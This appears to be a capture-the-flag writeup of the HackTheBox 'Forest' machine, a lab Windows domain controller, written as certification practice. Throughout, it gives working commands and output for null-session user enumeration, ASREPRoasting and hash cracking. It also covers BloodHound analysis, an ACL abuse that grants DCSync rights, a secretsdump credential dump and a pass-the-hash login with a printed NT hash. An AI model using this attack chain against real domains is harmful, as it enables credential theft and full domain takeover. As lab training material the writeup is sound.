---
title: "Forest"
description: "Writeup for the 'Easy' rated machine: Forest"
date: 2024-11-17 00:00:00 +0100
categories: [CTFs, hackthebox]
tags: [writeup, hackthebox, cpts_prep]
pin: false
math: true
mermaid: true
image:
  path: /assets/img/2024-11-16-writeup-htb-forest/Forest.png
---

### Overview
___
Forest in an easy difficulty Windows Domain Controller. We are able to enumerate domain users through a NULL session. Once we have our list of users, we notice that there is a service account `svc-alfresco`, we then decide to check if there are any account with kerberos pre-authentication enabled. We discover that we are able to get the hash for that service account (ASREPRoasting) and easily crack it, thus gaining a foothold in the domain. We then enumerate the domain with bloodhound just to find that this user has some interesting group memberships and privileges eventually allowing us to perform DCSync and get the Administrator NTLM hash which we then use with winrm to gain an Administrator shell.

### Initial Nmap Scan
___

```bash
naabu -host 10.129.30.97 -port 0-65535 -nmap-cli "nmap -A -T4 -oN nmap"

                  __
  ___  ___  ___ _/ /  __ __
 / _ \/ _ \/ _ \/ _ \/ // /
/_//_/\_,_/\_,_/_.__/\_,_/

                projectdiscovery.io

[INF] Current naabu version 2.3.1 (outdated)
[INF] Running CONNECT scan with non root privileges
10.129.30.97:389
10.129.30.97:49666
10.129.30.97:49664
10.129.30.97:49681
10.129.30.97:636
10.129.30.97:49667
10.129.30.97:47001
10.129.30.97:50033
10.129.30.97:49665
10.129.30.97:3269
10.129.30.97:49676
10.129.30.97:49671
10.129.30.97:464
10.129.30.97:3268
10.129.30.97:9389
10.129.30.97:5985
10.129.30.97:593
10.129.30.97:139
10.129.30.97:445
10.129.30.97:135
10.129.30.97:49677
10.129.30.97:49698
10.129.30.97:88
10.129.30.97:53
[INF] Found 24 ports on host 10.129.30.97 (10.129.30.97)
[INF] Running nmap command: nmap -A -T4 -oN nmap -p 49671,49666,53,49676,49667,47001,5985,49665,135,49677,49681,88,9389,464,3269,636,49664,389,593,3268,50033,49698,139,445 10.129.30.97
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-16 22:16 CET
Nmap scan report for FOREST (10.129.30.97)
Host is up (0.035s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-16 21:23:22Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49681/tcp open  msrpc        Microsoft Windows RPC
49698/tcp open  msrpc        Microsoft Windows RPC
50033/tcp open  msrpc        Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2024-11-16T13:24:16-08:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 2h46m50s, deviation: 4h37m10s, median: 6m49s
| smb2-time:
|   date: 2024-11-16T21:24:15
|_  start_date: 2024-11-16T20:19:03
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.83 seconds
```

From the scan results, we got the domain name (`htb.local`) as well as the hostname of the machine (`FOREST`). We can add them to our host file:

```bash
echo -e "10.129.30.97\tFOREST FOREST.htb.local htb.local" >> /etc/hosts
```

### Foothold
___
#### User Enumeration
___
First let's see if we can enumerate users with `rpcclient` by leveraging a SMB null session:

```bash
rpcclient -N -U "" 10.129.30.97
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

We could have also used `netexec` for this purpose:

```bash
nxc smb 10.129.30.97 -u '' -p '' --users
```

We got back a few users:
- Administrator
- krbtgt
- sebastien
- lucinda
- svc-alfresco
- andy
- mark
- santi

Let's note them somewhere and move on.

#### ASREPRoasting
___
Now that we have a list of users, we could try multiple things such as password spraying for example, but there are other things we could try first. For instance, let's see if among our list of users account there are some that do not require kerberos pre-authentication:

```bash
impacket-GetNPUsers htb.local/ -usersfile users -format hashcat -outputfile asrep_hashes.out
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:5f9...<SNIP>...63836d7
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```

As we can see, the service account `svc-alfresco` does not require kerberos pre-authentication, hence we were able to get its password hash.

> More on ASREPRoasting: [https://www.thehacker.recipes/ad/movement/kerberos/asreproast](https://www.thehacker.recipes/ad/movement/kerberos/asreproast)

We can now try to crack it with hashcat:

```bash
hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt
```

![](/assets/img/2024-11-16-writeup-htb-forest/cracked_hash_svcalfresco.png)

Now that we have the password for `svc-alfresco`, let's try to login via winrm:

```bash
evil-winrm -i 10.129.30.97 -u svc-alfresco -p <PASSWORD>
```

We successfully logged in and was able to retrieve the user flag at `C:\Users\svc-alfresco\Desktop\user.txt`

![](/assets/img/2024-11-16-writeup-htb-forest/user_flag.png)

### Privilege Escalation
___
Now that we have a foothold in the domain, let's use [bloodhound-python](https://github.com/dirkjanm/BloodHound.py) in order to collect information about the domain that we can than visualize after:

```bash
# Collecting data
bloodhoud-python -u svc-alfresco -p <PASSWORD> -ns 10.129.30.97 -d htb.local -c all
# Zipping the json output files
zip -r data.zip *.json
```

Now that we have our zip file ready, we can start bloodhound and upload the file. After going through the results, we notice that `svc-alfresco`, through nested group memberships, is in the `Account Operators` group which has `GenericAll` privilege on the `Exchange Windows Permissions` group which then have the `WriteDacl` privilege over the domain object.

![](/assets/img/2024-11-16-writeup-htb-forest/bloodhound.png)

With this information, we can do the following:
- Create a new domain user.
- Add that user to the `Exchange Windows Permissions` group by abusing our `GenericAll` privilege.
- As the new user, add `DCSync` privileges to our self by abusing the `WriteDacl` privilege.
- Dump all the hashes

```powershell
# Creating a new domain user (as svc-alfresco)
net user hackerr password123! /add /domain

# Add 'hackerr' to the Exchange Windows Permissions group
net group "Exchange Windows Permissions" hackerr /add

# Add DCSync privileges with 
$pass = ConvertTo-SecureString 'password123!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb.local\hackerr', $pass)
Add-ObjectACL -PrincipalIdentity hackerr -Credential $cred -Rights DCSync
```

Now `hackerr` should have DCSync rights. We can verify by using using impacket's secretsdump:

```bash
impacket-secretsdump htb.local/hackerr:'password123!'@10.129.30.97 -just-dc -outputfile dcsync.out
```

![](/assets/img/2024-11-16-writeup-htb-forest/dcsync.png)

We can use the Administrator's NThash to login via `winrm`:

```bash
evil-winrm -i 10.129.30.97 -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6'
```

We can then retrive the root flag.

![](/assets/img/2024-11-16-writeup-htb-forest/root_flag.png)